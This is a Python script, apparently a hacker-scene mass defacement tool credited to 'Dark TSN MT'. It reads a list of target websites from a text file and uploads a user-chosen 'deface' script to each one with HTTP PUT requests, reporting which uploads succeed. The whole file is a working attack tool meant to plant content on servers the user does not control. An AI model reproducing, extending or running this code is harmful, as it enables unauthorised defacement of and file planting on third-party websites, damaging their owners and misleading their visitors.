	# -*- coding: utf-8 -*-


try:
    import requests
    import os.path
    import sys
except ImportError:
    exit("install requests and try again ...")

banner = """
\033[1;32;40m=============================================
\033[1;31;40m|        Modified BY Dark TSN MT        |
\033[1;32;40m=============================================
\033[1;36;40m



========== TSN MT==============


\033[1;32;40m=============================================
\033[1;31;40m|        DEVELOPED BY TSN MT         |
\033[1;32;40m=============================================
 """


b = '\033[31m'
h = '\033[32m'
m = '\033[00m'


def x(tetew):
    ipt = ''
    if sys.version_info.major > 2:
        ipt = input(tetew)
    else:
        ipt = raw_input(tetew)

    return str(ipt)


def aox(script, target_file="000.txt"):
    op = open(script, "r").read()
    with open(target_file, "r") as target:
        target = target.readlines()
        s = requests.Session()
        print("uploading file to %d website" % (len(target)))
        for web in target:
            try:
                site = web.strip()
                if site.startswith("http://") is False:
                    site = "http://" + site
                req = s.put(site + "/" + script, data=op)
                if req.status_code < 200 or req.status_code >= 250:
                    print(m + "[" + b + " FAILED!" + m + " ] %s/%s" % (site, script))
                else:
                    print(m + "[" + h + " SUCCESS" + m + " ] %s/%s" % (site, script))

            except requests.exceptions.RequestException:
                continue
            except KeyboardInterrupt:
                print;
                exit()


def main(__bn__):
    print(__bn__)
    while True:
        try:
            a = x("\033[32m[\033[31m√\033[32m]\033[33mEnter Sour Script Deface Name:\033[32m ")
            if not os.path.isfile(a):
                print("file '%s' not found" % (a))
                continue
            else:
                break
        except KeyboardInterrupt:
            print;
            exit()

    aox(a)


if __name__ == "__main__":
    main(banner)


